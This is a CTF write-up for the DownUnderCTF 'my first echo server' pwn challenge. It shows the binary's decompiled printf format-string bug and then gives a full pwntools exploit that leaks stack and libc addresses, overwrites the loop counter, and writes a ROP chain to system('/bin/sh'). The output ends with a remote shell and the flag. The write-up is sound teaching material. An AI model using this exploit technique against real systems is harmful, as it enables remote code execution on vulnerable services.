# DownUnderCTF

## my first echo server

> 416
> 
> Author: k0wa1ski#6150 and Faith#2563
>
> Hello there! I learnt C last week and already made my own SaaS product, check it out! I even made sure not to use compiler flags like --please-make-me-extremely-insecure, so everything should be swell.
>
> `nc chal.duc.tf 30001`
>
> Hint - The challenge server is running Ubuntu 18.04.
>
> Attached files: [echos](echos) (sha256: 2311c57a6436e56814e1fe82bdd728f90e5832fda8abc71375ef3ef8d9d239ca)

Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _format-string_


## Summary

Basic format-string leak and exploit.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Mitigations in place.  Finally.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  int local_5c;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_5c = 0;
  while (local_5c < 3) {
    fgets(local_58,0x40,stdin);
    printf(local_58);
    local_5c = local_5c + 1;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

`printf(local_58)` is the vulnerability, and looped three times (`local_5c`, remember this--we'll fix it later).

The attack is fairly simple, use the stack to leak the stack and libc.  We will however need to know the version of libc for the exploit I have in mind (to get a hint just: `strings echos | grep GCC`):

```
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```

Next, from within a Ubuntu 18.04 container, find the format-string offset and look at the stack:

```
gef➤  b *main+73
Breakpoint 1 at 0x866
gef➤  run
Starting program: /pwd/datajerk/downunderctf2020/my_first_echo_server/echos
%8$p
0xa70243825
```

Above, set a break point to get the stack while in `main`, and also try `%n$p` where `n > 0` until the output (in little endian) hex matches the input.  In this case it's `8`, and that will be the offset.

The stack:

```
0x00007fffffffe2f0│+0x0000: 0x00007fffffffe310  →  0x0000000000000002	 ← $rsp
0x00007fffffffe2f8│+0x0008: 0x0000000055754d98
0x00007fffffffe300│+0x0010: 0x0000000a70243825 ("%8$p\n"?)
0x00007fffffffe308│+0x0018: 0x000055555555481a  →  <setup+64> nop
0x00007fffffffe310│+0x0020: 0x0000000000000002
0x00007fffffffe318│+0x0028: 0x00005555555548dd  →  <__libc_csu_init+77> add rbx, 0x1
0x00007fffffffe320│+0x0030: 0x00007ffff7de59f0  →  <_dl_fini+0> push rbp
0x00007fffffffe328│+0x0038: 0x0000000000000000
0x00007fffffffe330│+0x0040: 0x0000555555554890  →  <__libc_csu_init+0> push r15
0x00007fffffffe338│+0x0048: 0x00005555555546d0  →  <_start+0> xor ebp, ebp
0x00007fffffffe340│+0x0050: 0x00007fffffffe430  →  0x0000000000000001
0x00007fffffffe348│+0x0058: 0x677c5564ed27b300
0x00007fffffffe350│+0x0060: 0x0000555555554890  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007fffffffe358│+0x0068: 0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax
```

Starting from the top (offset 6) looking down there are two values that if leaked will give us the stack address of the return address (offset 6 (`+0x0000`)) and the version and location of libc (offset 19 (`+0x0068`)).

With this in hand it will be easy to write out a ROP chain to call `system` on exit.


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./echos')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    libc = binary.libc
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    libc_index = 3
    p = remote('chal.duc.tf', 30001)
```

Boilerplate pwntool, however, `libc_index` is not _boilerplate_.  More on this below.


### Leak

```python
p.sendline('%6$p,%19$p')
_ = p.recvline().strip().split(b',')

stack_ret_addr = int(_[0],16) + 72
log.info('stack_ret_addr: ' + hex(stack_ret_addr))

__libc_start_main_231 = int(_[1],16)
log.info('__libc_start_main_231: ' + hex(__libc_start_main_231))
log.info('__libc_start_main: ' + hex(__libc_start_main_231 - 231))
```

Requesting parameters 6 and 19 provide the necessary bits to compute the location of the return address and libc (if we know the libc version).


### Find and download libc

```python
if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'__libc_start_main':hex(__libc_start_main_231 - 231)[-3:]}})
        libc_url = r.json()[libc_index]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)

libc.address = __libc_start_main_231 - libc.sym.__libc_start_main - 231
log.info('libc.address: ' + hex(libc.address))
```

> This is something new I'm experimenting with.

This code will search the libc-database and return an array of matches; through trial and error the 3rd (see `libc_index = 3` above) is the libc that works with this challenge.


### Get a shell, get the flag

```python
offset = 8
rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

# unlimited free rides
payload = fmtstr_payload(offset,{stack_ret_addr-0x5c:0x80000000})
p.sendline(payload)
null = payload.find(b'\x00')
p.recvuntil(payload[null-2:null])

payloads = [pop_rdi + 1,pop_rdi,libc.search(b'/bin/sh').__next__(),libc.sym.system]
for i in range(len(payloads)):
    payload=fmtstr_payload(offset,{stack_ret_addr+8*i:payloads[i]},write_size='short')
    p.sendline(payload)
    null = payload.find(b'\x00')
    p.recvuntil(payload[null-2:null])

# game over
payload = fmtstr_payload(offset,{stack_ret_addr-0x5c:0x00000003})
p.sendline(payload)
null = payload.find(b'\x00')
p.recvuntil(payload[null-2:null])
p.interactive()
```

This challenge has two constraints we have to deal with.  First, `fgets` only _gets_ 64 (`0x40`) bytes.  That is pretty small for a large format string exploit.  Second, `local_5c` once incremented to `3` exits the loop.  We burned the first pass leaking info.  Furthermore, each pass can really only write out one 8-byte format-string payload.  With two passes we could use _one gadget_ plus write out a NULL for it's constraint.  However I opted for a more portable solution (I'm sure there will be many _one gadget_ write ups).

The first block after setting up `pop_rdi`, will change `local_5c` to a very large negative number (`0x80000000` (-2147483648)).  Since the compare is with an `int` we can leverage an integer overflow vulnerability.  Thanks to Ghidra we know where `local_5c` is as well, just by it's name, i.e. `0x5c` from the return address in the stack.

Now with unlimited passes we can write out a ROP chain to get `system` from libc.

The `payloads` array is standard CTF fare.  The for loop uses format-string exploits to write out the payload starting from the return address in the stack.

To exit the loop we write `3` to `local_5c`.

> The following lines capture all the format-string exploit garbage for pretty screen grabs (for write-ups):
> 
> ```python
> null = payload.find(b'\x00')
> p.recvuntil(payload[null-2:null])
> ``` 

> NOTE: This code will fail at times due to ASLR.  I should check for _badchars_ in the payload that may prematurely terminate `fgets`, but it is simple to just rerun.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2020/my_first_echo_server/echos'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.duc.tf on port 30001: Done
[*] stack_ret_addr: 0x7fffc00c3e88
[*] __libc_start_main_231: 0x7f4c28d0db97
[*] __libc_start_main: 0x7f4c28d0dab0
[*] getting: https://libc.rip/download/libc6_2.27-3ubuntu1_amd64.so
[*] '/pwd/datajerk/downunderctf2020/my_first_echo_server/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7f4c28cec000
[*] Loaded 196 cached gadgets for 'libc6_2.27-3ubuntu1_amd64.so'
[*] Switching to interactive mode
$ id
uid=1000 gid=999 groups=999
$ ls -l
total 16
-rwxr-xr-x 1 65534 65534 8560 Sep 15 13:10 echos
-rw-r--r-- 1 65534 65534   36 Sep  4 04:31 flag.txt
$ cat flag.txt
DUCTF{D@N6340U$_AF_F0RMAT_STTR1NG$}
```